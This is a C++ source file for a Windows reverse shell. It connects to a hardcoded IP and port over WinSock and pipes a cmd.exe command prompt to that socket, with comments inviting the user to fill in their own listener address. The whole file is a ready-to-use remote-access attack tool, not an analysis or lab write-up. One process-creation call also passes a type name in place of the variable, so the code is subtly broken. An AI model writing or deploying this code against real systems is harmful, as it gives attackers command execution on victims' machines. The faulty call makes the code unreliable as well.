// C++ Reverse Shell

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#define WSASocket WSASocketW
#pragma comment(lib, "Ws2_32.lib")


int main()
{
    SOCKET shell;       // Defining the shell
    sockaddr_in shell_addr;        // linking the socaddr and shelladdr
    WSADATA wsa;             // adding new name for WSDATA
    STARTUPINFO si;       // Defining the structure
    PROCESS_INFORMATION pi;    //
    char RecvServer[512];  // Size of bytes you are going to send
    int connection;
    char ip_addr[] = "192.168.94.129";  // enter your IP address
    int port = 8080;     // Enter the port you want to listen on

    
    WSAStartup(MAKEWORD(2,2), &wsa);   // Initiliazing WinSock v.2
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);  // Create a TCP Socket

    shell_addr.sin_port = htons(port);  // Specifiying shell to read and connect to the value of Port
    shell_addr.sin_family = AF_INET;    // Specifying the protocol used which is TCP
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell, (SOCKADDR *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // Connect to the target server

    if (connection == SOCKET_ERROR) // Creating an error value
    {
        printf("[!] Connection to the target server failed, Please try again!\n");
        exit(0);         // You do not have to exit, I just chose to. You can always loop back 
    }

    else
    {

        recv(shell, RecvServer, sizeof(RecvServer), 0); // Specifying that we are listening in a Shell thats named RecvServer and the size is that of the Server(512)
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;  // Pipe std Input/Output/Error to the socket
        CreateProcessA(0, "cmd.exe", NULL, NULL, 0, NULL, &si, &PROCESS_INFORMATION);  // Spawn Command Prompt
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);          // Closing the handler Process
        CloseHandle(pi.hThread);           // Closing the handler Threads
        memset(RecvServer, 0, sizeof(RecvServer));
    }
}    